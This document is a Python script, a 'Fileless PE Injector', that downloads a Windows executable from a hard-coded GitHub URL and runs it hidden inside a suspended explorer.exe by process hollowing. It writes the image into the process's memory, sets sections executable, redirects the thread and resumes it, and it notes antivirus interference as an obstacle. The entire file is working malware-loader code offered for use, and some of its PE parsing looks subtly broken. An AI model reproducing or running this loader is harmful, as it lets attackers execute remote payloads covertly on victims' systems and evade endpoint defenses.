# Save this as fixed_injector.py
import ctypes
import urllib.request
import struct
import sys

# Windows API Setup
k32 = ctypes.WinDLL('kernel32', use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
CREATE_SUSPENDED = 0x4

# Structures
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb", ctypes.c_ulong),
        ("lpReserved", ctypes.c_wchar_p),
        ("lpDesktop", ctypes.c_wchar_p),
        ("lpTitle", ctypes.c_wchar_p),
        ("dwX", ctypes.c_ulong),
        ("dwY", ctypes.c_ulong),
        ("dwXSize", ctypes.c_ulong),
        ("dwYSize", ctypes.c_ulong),
        ("dwXCountChars", ctypes.c_ulong),
        ("dwYCountChars", ctypes.c_ulong),
        ("dwFillAttribute", ctypes.c_ulong),
        ("dwFlags", ctypes.c_ulong),
        ("wShowWindow", ctypes.c_ushort),
        ("cbReserved2", ctypes.c_ushort),
        ("lpReserved2", ctypes.POINTER(ctypes.c_byte)),
        ("hStdInput", ctypes.c_void_p),
        ("hStdOutput", ctypes.c_void_p),
        ("hStdError", ctypes.c_void_p),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", ctypes.c_void_p),
        ("hThread", ctypes.c_void_p),
        ("dwProcessId", ctypes.c_ulong),
        ("dwThreadId", ctypes.c_ulong),
    ]

def inject_pe(pe_url, target_process="explorer.exe"):
    print(f"[1] Downloading: {pe_url}")
    
    # Download PE
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        req = urllib.request.Request(pe_url, headers=headers)
        with urllib.request.urlopen(req) as response:
            pe_data = bytearray(response.read())
    except Exception as e:
        print(f"[-] Download failed: {e}")
        return False
    
    if len(pe_data) < 100 or pe_data[0:2] != b'MZ':
        print("[-] Invalid PE file")
        return False
    
    print(f"[2] Downloaded {len(pe_data):,} bytes")
    
    # Parse PE headers
    pe_offset = struct.unpack('<I', pe_data[60:64])[0]
    image_size = struct.unpack('<I', pe_data[pe_offset+80:pe_offset+84])[0]
    print(f"[3] Image size: {image_size:,} bytes")
    
    # Create suspended process
    print(f"[4] Creating: {target_process}")
    
    si = STARTUPINFOW()
    si.cb = ctypes.sizeof(STARTUPINFOW)
    pi = PROCESS_INFORMATION()
    
    # Convert target to wide string
    target_wide = target_process if isinstance(target_process, str) else str(target_process)
    
    # CreateProcessW parameters
    CREATE_NO_WINDOW = 0x08000000
    result = k32.CreateProcessW(
        None,                    # lpApplicationName
        target_wide,             # lpCommandLine
        None,                    # lpProcessAttributes
        None,                    # lpThreadAttributes
        False,                   # bInheritHandles
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  # dwCreationFlags
        None,                    # lpEnvironment
        None,                    # lpCurrentDirectory
        ctypes.byref(si),        # lpStartupInfo
        ctypes.byref(pi)         # lpProcessInformation
    )
    
    if not result:
        error = ctypes.GetLastError()
        print(f"[-] CreateProcess failed with error: {error}")
        return False
    
    print(f"[5] Process created (PID: {pi.dwProcessId})")
    
    # Allocate memory in target process
    alloc_addr = k32.VirtualAllocEx(
        pi.hProcess,             # hProcess
        0,                       # lpAddress
        image_size,              # dwSize
        MEM_COMMIT | MEM_RESERVE, # flAllocationType
        PAGE_READWRITE           # flProtect
    )
    
    if not alloc_addr:
        error = ctypes.GetLastError()
        print(f"[-] VirtualAllocEx failed: {error}")
        k32.CloseHandle(pi.hProcess)
        k32.CloseHandle(pi.hThread)
        return False
    
    print(f"[6] Memory allocated at: {hex(alloc_addr)}")
    
    # Write PE headers
    written = ctypes.c_size_t(0)
    
    # Calculate header size
    opt_header_size = struct.unpack('<H', pe_data[pe_offset+20:pe_offset+22])[0]
    header_size = pe_offset + 24 + opt_header_size
    
    # Write headers
    k32.WriteProcessMemory(
        pi.hProcess,            # hProcess
        alloc_addr,             # lpBaseAddress
        pe_data,                # lpBuffer
        header_size,            # nSize
        ctypes.byref(written)   # lpNumberOfBytesWritten
    )
    
    print(f"[7] Wrote {written.value} bytes (headers)")
    
    # Write sections
    num_sections = struct.unpack('<H', pe_data[pe_offset+6:pe_offset+8])[0]
    section_table = pe_offset + 248
    
    print(f"[8] Writing {num_sections} sections")
    
    for i in range(num_sections):
        sec_start = section_table + (i * 40)
        if sec_start + 40 > len(pe_data):
            break
        
        # Section data
        virtual_addr = struct.unpack('<I', pe_data[sec_start+12:sec_start+16])[0]
        raw_size = struct.unpack('<I', pe_data[sec_start+16:sec_start+20])[0]
        raw_offset = struct.unpack('<I', pe_data[sec_start+20:sec_start+24])[0]
        
        if raw_size > 0 and raw_offset + raw_size <= len(pe_data):
            section_data = pe_data[raw_offset:raw_offset + raw_size]
            k32.WriteProcessMemory(
                pi.hProcess,
                alloc_addr + virtual_addr,
                section_data,
                raw_size,
                ctypes.byref(written)
            )
    
    # Set memory protection for executable sections
    for i in range(num_sections):
        sec_start = section_table + (i * 40)
        if sec_start + 40 > len(pe_data):
            break
        
        virtual_addr = struct.unpack('<I', pe_data[sec_start+12:sec_start+16])[0]
        characteristics = struct.unpack('<I', pe_data[sec_start+36:sec_start+40])[0]
        
        # Check if section is executable
        if characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
            old_protect = ctypes.c_ulong(0)
            k32.VirtualProtectEx(
                pi.hProcess,
                alloc_addr + virtual_addr,
                0x1000,  # 4KB page
                PAGE_EXECUTE_READWRITE,
                ctypes.byref(old_protect)
            )
    
    # Get thread context (for x64)
    class CONTEXT(ctypes.Structure):
        _fields_ = [
            ("context_flags", ctypes.c_ulonglong),
            ("dr0", ctypes.c_ulonglong),
            ("dr1", ctypes.c_ulonglong),
            ("dr2", ctypes.c_ulonglong),
            ("dr3", ctypes.c_ulonglong),
            ("dr6", ctypes.c_ulonglong),
            ("dr7", ctypes.c_ulonglong),
            ("rax", ctypes.c_ulonglong),
            ("rcx", ctypes.c_ulonglong),
            ("rdx", ctypes.c_ulonglong),
            ("rbx", ctypes.c_ulonglong),
            ("rsp", ctypes.c_ulonglong),
            ("rbp", ctypes.c_ulonglong),
            ("rsi", ctypes.c_ulonglong),
            ("rdi", ctypes.c_ulonglong),
            ("r8", ctypes.c_ulonglong),
            ("r9", ctypes.c_ulonglong),
            ("r10", ctypes.c_ulonglong),
            ("r11", ctypes.c_ulonglong),
            ("r12", ctypes.c_ulonglong),
            ("r13", ctypes.c_ulonglong),
            ("r14", ctypes.c_ulonglong),
            ("r15", ctypes.c_ulonglong),
            ("rip", ctypes.c_ulonglong),
        ]
    
    CONTEXT_FULL = 0x10007
    context = CONTEXT()
    context.context_flags = CONTEXT_FULL
    
    # Try to get and set context
    try:
        k32.GetThreadContext(pi.hThread, ctypes.byref(context))
        
        # Calculate entry point
        entry_point = struct.unpack('<I', pe_data[pe_offset+40:pe_offset+44])[0]
        entry_addr = alloc_addr + entry_point
        
        # Set RIP (x64 instruction pointer)
        context.rip = entry_addr
        
        k32.SetThreadContext(pi.hThread, ctypes.byref(context))
        print("[9] Thread context updated")
    except:
        # If context fails, just continue
        print("[9] Context update skipped (using default entry)")
    
    # Resume thread
    print("[10] Resuming thread...")
    k32.ResumeThread(pi.hThread)
    
    # Cleanup
    k32.CloseHandle(pi.hThread)
    k32.CloseHandle(pi.hProcess)
    
    print("[+] Injection successful!")
    print(f"[+] GUI EXE is now running in {target_process}")
    return True

def main():
    print("=== Fileless PE Injector ===")
    print("Supports GUI applications")
    print("=" * 30)
    
    # Check admin
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            print("Warning: Run as Administrator for best results")
            print("(Right-click PowerShell/CMD -> Run as Administrator)")
    except:
        pass
    
    # Use your GitHub URL
    pe_url = "https://raw.githubusercontent.com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"
    target = "explorer.exe"
    
    print(f"\nDefault URL: {pe_url}")
    print(f"Target: {target}")
    
    choice = input("\nPress Enter to use defaults, or type 'c' for custom: ")
    
    if choice.lower() == 'c':
        pe_url = input("Enter EXE URL: ")
        target = input("Enter target process (default: explorer.exe): ") or "explorer.exe"
    
    print(f"\nStarting injection...")
    print(f"URL: {pe_url}")
    print(f"Target: {target}")
    print("-" * 40)
    
    success = inject_pe(pe_url, target)
    
    if success:
        print("\n✓ Success! The GUI should appear shortly.")
        print("✓ The EXE runs entirely in memory (fileless)")
        print("✓ Embedded in: " + target)
    else:
        print("\n✗ Injection failed")
        print("Possible issues:")
        print("1. Not running as Administrator")
        print("2. Invalid PE file")
        print("3. Target process not found")
        print("4. Antivirus interference")
    
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
